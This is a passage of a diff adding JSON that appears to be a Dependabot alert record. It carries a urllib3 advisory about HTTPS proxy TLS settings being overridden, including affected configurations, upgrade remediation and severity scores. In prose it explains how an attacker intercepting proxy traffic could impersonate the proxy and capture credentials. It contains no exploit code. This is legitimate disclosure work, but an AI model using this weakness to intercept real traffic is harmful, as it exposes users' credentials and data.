+        "manifest_path": "uv.lock",
+        "scope": "runtime",
+        "relationship": "transitive"
+      },
+      "security_advisory": {
+        "ghsa_id": "GHSA-8988-9cw3-xx77",
+        "cve_id": "CVE-2026-97687",
+        "summary": "urllib3: HTTPS proxy TLS configuration may be ignored or overridden",
+        "description": "## Impact\n\nurllib3 supports configuring TLS independently for an HTTPS proxy and the target server.\n\n`proxy_ssl_context`, `proxy_assert_hostname`, and `proxy_assert_fingerprint` configure the TLS connection to the proxy. `ssl_context` and the other target-specific TLS parameters configure the connection to the target server.\n\nIn urllib3 versions 1.26.0 through 2.7.0, these configurations were not consistently separated. Depending on the proxy mode, urllib3 could:\n\n1. Ignore `proxy_ssl_context` and use the target server's SSL context for the TLS connection to an HTTPS forwarding proxy.\n2. Override the HTTPS proxy's certificate-verification policy with the target server's certificate-verification policy.\n3. Apply target-specific SNI, hostname assertions, certificate fingerprint assertions, or TLS client credentials to the TLS connection to an HTTPS forwarding proxy.\n\nIn particular, configuring `cert_reqs=\"CERT_NONE\"` for a target server could overwrite the `verify_mode` of the SSL context configured for the HTTPS proxy. This modification occurred in place and persisted on the context object, potentially disabling proxy certificate verification for later connections that reused the same context.\n\nAn attacker able to intercept the connection to an HTTPS proxy may be able to impersonate the proxy when the effective proxy TLS configuration disables certificate verification or otherwise accepts the attacker's certificate. This may occur, for example, when the target server's trust or identity policy is incorrectly applied to the proxy connection.\n\nWhen HTTPS forwarding is enabled, an impersonated proxy can observe or modify forwarded requests and responses, potentially exposing credentials, authentication tokens, request bodies, response data, and other sensitive information.\n\nA TLS client certificate intended for the target server may also be presented to the proxy or to an attacker impersonating it. This can disclose the client's identity and provide proof of possession of the corresponding private key. The private key itself is not transmitted during the TLS handshake.\n\nIn CONNECT tunneling mode, impersonating the HTTPS proxy does not by itself defeat the separate end-to-end TLS connection between the client and the target server.\n\n## Affected Usages\n\nCode using urllib3 versions 1.26.0 through 2.7.0 may be affected in any of the following cases.\n\n### 1. The target SSL context is used for an HTTPS forwarding proxy\n\nHTTPS requests are forwarded through an HTTPS proxy with `use_forwarding_for_https=True`, and `proxy_ssl_context` is configured for the proxy.\n\nurllib3 may ignore `proxy_ssl_context` and use the target server's `ssl_context` for the proxy TLS handshake. The proxy may therefore be verified using the target server's trust and certificate policy instead of the policy explicitly configured for the proxy.\n\n### 2. The target verification policy overrides the proxy policy\n\nAn HTTPS proxy is configured with `proxy_ssl_context`, while the target server uses a different certificate-verification policy.\n\nurllib3 may apply the target server's `cert_reqs` value to the proxy SSL context. For example, setting `cert_reqs=\"CERT_NONE\"` for the target server may also disable certificate verification for the HTTPS proxy, even when `proxy_ssl_context` was configured to require verification.\n\nThis issue can affect the TLS connection to an HTTPS proxy in both forwarding and CONNECT tunneling configurations.\n\n### 3. A mutated proxy SSL context is reused\n\nThe same SSL context is reused as `proxy_ssl_context` across multiple connections, and certificate verification is disabled for one target server.\n\nurllib3 may modify the proxy SSL context's `verify_mode` in place. Later connections that reuse the same context may therefore connect to the HTTPS proxy without certificate verification.\n\n### 4. Target-specific TLS identity or credentials are applied to the proxy\n\nHTTPS requests are forwarded through an HTTPS proxy with `use_forwarding_for_https=True`, and target-specific SNI, hostname assertions, certificate fingerprint assertions, or TLS client credentials are configured.\n\nurllib3 may apply these target-specific settings to the proxy TLS handshake. This may cause urllib3 to:\n\n- send SNI intended for the target server to the proxy;\n- verify the proxy using a hostname or certificate fingerprint intended for the target server; or\n- present a TLS client certificate intended for the target server to the proxy.\n\nCode connecting through a plain HTTP proxy does not establish a TLS connection to the proxy and is not affected by this issue.\n\n## Remediation\n\nUpgrade to urllib3 2.8.0 or later.\n\nurllib3 2.8.0 independently applies the explicitly configured `proxy_ssl_context` and proxy-specific certificate assertions to the HTTPS proxy connection. Target-specific SNI, certificate assertions, and TLS client certificate parameters are no longer applied to the HTTPS proxy handshake.\n\nFor backward compatibility, when an HTTPS proxy is used with `use_forwarding_for_https=True` and `proxy_ssl_context` is not provided, urllib3 2.8.0 continues to use `ssl_context` for the TLS connection to the proxy. This configuration emits a `FutureWarning`. In urllib3 3.0, passing `ssl_context` with `use_forwarding_for_https=True` for an HTTPS proxy will raise an error. Applications should use `proxy_ssl_context` to configure TLS for an HTTPS forwarding proxy.\n\nThe fixes were implemented in commits b6447295fff7b38fdffc67e0df9712d60cef3cc3 and 07408cec79d1856d81bb42c74a904a24fdb9e465.",
+        "severity": "high",
+        "identifiers": [
+          {
+            "value": "GHSA-8988-9cw3-xx77",
+            "type": "GHSA"
+          },
+          {
+            "value": "CVE-2026-97687",
+            "type": "CVE"
+          }
+        ],
+        "references": [
+          {
+            "url": "https://github.com/urllib3/urllib3/security/advisories/GHSA-8988-9cw3-xx77"
+          },
+          {
+            "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-97687"
+          },
+          {
+            "url": "https://github.com/urllib3/urllib3/pull/5093"
+          },
+          {
+            "url": "https://github.com/urllib3/urllib3/commit/07408cec79d1856d81bb42c74a904a24fdb9e465"
+          },
+          {
+            "url": "https://github.com/urllib3/urllib3/commit/b6447295fff7b38fdffc67e0df9712d60cef3cc3"
+          },
+          {
+            "url": "https://github.com/urllib3/urllib3/releases/tag/2.8.0"
+          },
+          {
+            "url": "https://github.com/advisories/GHSA-8988-9cw3-xx77"
+          }
+        ],
+        "published_at": "2026-09-30T14:46:04Z",
+        "updated_at": "2026-09-30T14:46:05Z",
+        "withdrawn_at": null,
+        "vulnerabilities": [
+          {
+            "package": {
+              "ecosystem": "pip",
+              "name": "urllib3"
+            },
+            "severity": "high",
+            "vulnerable_version_range": ">= 1.26.0, < 2.8.0",
+            "first_patched_version": {
+              "identifier": "2.8.0"
+            }
+          }
+        ],
+        "cvss_severities": {
+          "cvss_v3": {
+            "vector_string": null,
+            "score": 0.0
+          },
+          "cvss_v4": {
+            "vector_string": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N",
+            "score": 7.6
+          }
+        },
+        "epss": {
+          "percentage": 0.00242,
+          "percentile": 0.13858
+        },
+        "cvss": {
+          "vector_string": null,
+          "score": 0.0
+        },
+        "cwes": [
+          {
+            "cwe_id": "CWE-295",
+            "name": "Improper Certificate Validation"
+          },
+          {
+            "cwe_id": "CWE-440",
+            "name": "Expected Behavior Violation"
+          }
+        ],
+        "classification": "general"
+      },
+      "security_vulnerability": {
+        "package": {
+          "ecosystem": "pip",
+          "name": "urllib3"
+        },
+        "severity": "high",
+        "vulnerable_version_range": ">= 1.26.0, < 2.8.0",
+        "first_patched_version": {
+          "identifier": "2.8.0"
+        }
+      },
+      "url": "https://api.github.com/repos/unified-systems-com/tap/dependabot/alerts/43",
+      "html_url": "https://github.com/unified-systems-com/tap/security/dependabot/43",
+      "created_at": "2026-10-01T03:38:45Z",
+      "updated_at": "2026-10-01T16:35:49Z",
+      "dismissal_request": null,
+      "assignees": [],
+      "dismissed_at": null,
+      "dismissed_by": null,
+      "dismissed_reason": null,
+      "dismissed_comment": null,
+      "fixed_at": "2026-10-01T16:35:49Z",
+      "auto_dismissed_at": null
+    }
+  ]
+}
